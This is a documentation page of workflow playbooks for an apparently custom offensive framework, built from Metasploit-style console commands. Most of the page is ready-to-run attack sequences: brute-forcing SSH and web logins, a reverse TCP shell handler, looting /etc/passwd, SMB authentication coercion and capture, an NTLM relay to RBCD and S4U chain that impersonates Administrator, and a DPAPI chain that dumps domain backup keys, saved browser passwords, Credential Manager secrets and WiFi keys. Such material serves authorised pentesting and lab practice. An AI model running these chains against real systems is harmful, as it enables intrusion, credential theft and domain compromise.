# Workflows

Playbooks that chain the framework into full engagement patterns. Save
your own as resource files (`resource engagement.rc`) — methodology you
can replay is methodology that improves.

## Lab night: the full loop in five minutes

```
lab up web
use auxiliary/scanner/dir_buster
set RHOSTS 127.0.0.1
set RPORT 18080
set WORDLIST labs/web/wordlists/dirs.txt
set RECURSE true
run                      # findings -> loot

use auxiliary/login/http_login
set RHOSTS 127.0.0.1
set RPORT 18080
set MODE form
set TARGETPATH /login
set USERNAME admin
set PASS_FILE labs/web/wordlists/passwords.txt
run                      # credential -> creds

report lab-evidence.md
lab down web
```

Everything above works verbatim today. Note the order: enumeration wrote
loot, the attack wrote creds, the report read both.

## HTB-style box: recon → foothold → evidence

```
spool box-name.log                    # evidence habit: first, always
workspace htb-s8-boxname
setg LHOST tun0

# recon
use auxiliary/scanner/port_scan
set RHOSTS 10.10.11.20
set PORTS 1-10000
run -j                                # background while you think
jobs -o 1

# web? fingerprint + bust
use auxiliary/scanner/http_headers
set RHOSTS 10.10.11.20
set RPORT 80
run
use auxiliary/scanner/dir_buster
set RHOSTS 10.10.11.20
set RPORT 80
set WORDLIST /usr/share/wordlists/dirb/common.txt
set RECURSE true
run -j

# something to brute? ssh/web login with framework creds first
use auxiliary/login/ssh_login
set RHOSTS 10.10.11.20
set USER_FILE users.txt
set PASS_FILE passwords.txt
run -j

# foothold: handler first, payload second
use exploits/multi/handler
set LPORT 4444
run -j
use payloads/python_reverse_tcp
set LPORT 4444
generate                              # deliver via your exploit primitive
# [+] Session 1 opened
sessions -u 1                         # pty upgrade, then interact

# pillage: loot files, creds, then report
loot -f file etc-passwd /tmp/looted-passwd
report box-name.md
```

## Writing a module mid-engagement

The framework's reason to exist. New service you've never seen?

```
template auxiliary/scanner/redis_enum
reload
use auxiliary/scanner/redis_enum     # fill TODOs, edit, reload, repeat
```

Iterate against a lab if one fits (`lab up`), or the real target if it's
yours to touch. When it works: unit tests for the helpers, integration
if there's a lab. See [[Modules]], [[Testing]].

## Recon as a replayable resource file

`~/recon.rc`:

```
# standard opening moves — resource recon.rc
setg LHOST tun0
use auxiliary/scanner/port_scan
set PORTS 1-10000
run -j
use auxiliary/scanner/http_headers
run
```

`./forge.py -r ~/recon.rc` — boots, runs it, drops you interactive
with jobs already going.

## The coerce -> capture loop

Two consoles (or `run -j` the capture):

```
# console 1 — listen for the phoned-home auth (445 needs root)
use auxiliary/attack/smb_capture
set LPORT 445
run

# console 2 — make the target phone home
use auxiliary/attack/coerce
set RHOSTS target.corp.local
set LISTENER <your forge box>
set DOMAIN corp.local
set USERNAME anyuser
set PASSWORD ...
run
```

The coerced machine account's NetNTLMv2 lands in loot (type 'hash',
hashcat mode 5600, challenge pinned to 1122334455667788).

## The coerce -> relay -> RBCD -> s4u chain

relay_smb takes the same coerced auth and FORWARDS it to LDAP on the
DC — the machine account writes its own RBCD there, and s4u turns the
delegation into a ticket:

```
# console 1 — relay (445 needs root; the callback is a UNC path, no port)
use auxiliary/attack/relay_smb
set RHOSTS dc.corp.local
set SOURCE FZRELAY$          # an account you control (add_computer)
run

# console 2 — create the source, then coerce
use auxiliary/attack/add_computer
set RHOSTS dc.corp.local
set DOMAIN corp.local
set USERNAME Administrator
set PASSWORD ...
set COMPUTER_NAME FZRELAY$
set COMPUTER_PASSWORD Passw0rd123!
run

use auxiliary/attack/coerce
set RHOSTS target.corp.local
set LISTENER <your forge box>
set DOMAIN corp.local
set USERNAME anyuser
set PASSWORD ...
run

# console 1 again — after "RBCD set via relay"
use auxiliary/attack/s4u
set RHOSTS dc.corp.local
set DOMAIN corp.local
set USERNAME FZRELAY$
set PASSWORD Passw0rd123!
set SPN cifs/target.corp.local
set IMPERSONATE Administrator
run
```

Lab caveat: Samba DCs deny the RBCD self-write (the relay e2e proves
the chain up to that denial) — Windows DCs accept it. That's the field
behavior the module is built for.

## The DPAPI chain

One domain backup key opens everything every domain user ever
protected. In order, each stage feeding the next:

```
use auxiliary/attack/dpapi_backupkey     # 1: the domain's backup key pair (DC admin)
set RHOSTS dc.corp.local
set DOMAIN corp.local
set USERNAME Administrator
set PASSWORD ...
run

use auxiliary/attack/dpapi_masterkeys    # 2: every domain user's masterkeys on a box
set RHOSTS workstation.corp.local
set DOMAIN corp.local
set USERNAME Administrator
set PASSWORD ...
run

use auxiliary/attack/dpapi_credentials   # 3: Credential Manager plaintext (cmdkey/RDP/drive logons)
set RHOSTS workstation.corp.local
set DOMAIN corp.local
set USERNAME Administrator
set PASSWORD ...
run

use auxiliary/attack/dpapi_chrome        # 4: saved Chrome/Edge passwords
set RHOSTS workstation.corp.local
set DOMAIN corp.local
set USERNAME Administrator
set PASSWORD ...
run

use auxiliary/attack/dpapi_system        # 5: machine side — DPAPI_SYSTEM keys, WiFi passwords
set RHOSTS workstation.corp.local
set DOMAIN corp.local
set USERNAME Administrator
set PASSWORD ...
run
```

Stages 2-4 read the dpapi-backupkey loot from stage 1 automatically
(KEY_LOOT picks a specific one); stage 5 is independent (it pulls its
own keys from the target's hives). Everything lands in creds + loot —
recovered passwords feed multi_spray like any other cred.
